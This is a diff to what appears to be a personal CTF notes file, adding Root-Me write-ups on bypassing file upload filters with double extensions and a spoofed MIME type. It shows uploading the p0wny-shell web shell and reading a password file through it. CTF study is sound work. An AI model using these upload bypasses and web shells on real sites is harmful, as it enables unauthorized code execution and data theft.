@@ -263,6 +263,34 @@ if(isset($_POST["ip"]) && !empty($_POST["ip"])){
     - Có file install.php
     - curl http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/install.php
     - Copy the flag from the response.
+
+## [File upload - Double extensions](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions)
+### Steps to reproduce
+    - Test upload file abc.php --> bị chặn
+    - Test upload file abc.php.png --> done
+    - Sử dụng p0wny-shell để đọc file
+    - git clone https://github.com/flozz/p0wny-shell.git
+    - cd p0wny-shell/
+    - mv shell.php shell.php.png
+    - Truy cập http://challenge01.root-me.org/web-serveur/ch20/
+    - Uload file shell.php.png
+    - chạy như 1 terminal. ls,cd, cat .passwd
+    - Copy the flag from the response
+
+## [File upload - MIME type](https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type)
+### Steps to reproduce
+    - Sử dụng lại shell.php ở chall trên
+    - cd p0wny-shell/
+    - Test upload file shell.php --> bị chặn
+    - Test upload file shell.php.png --> ok
+    - Nhưng khi truy cập file thì bị lỗi không hoạt động shell
+    - Tại file .png nên đang hiểu là ảnh
+    - Sử dụng Burp Suite để sửa header Content-Type từ image/png và đổi tên file thành shell.php
+    - oke shell hoạt động
+    - chạy như 1 terminal. ls,cd, cat .passwd
+    - Copy the flag from the response
+
+
     
 # 2.  Web application vulnerabilities
 
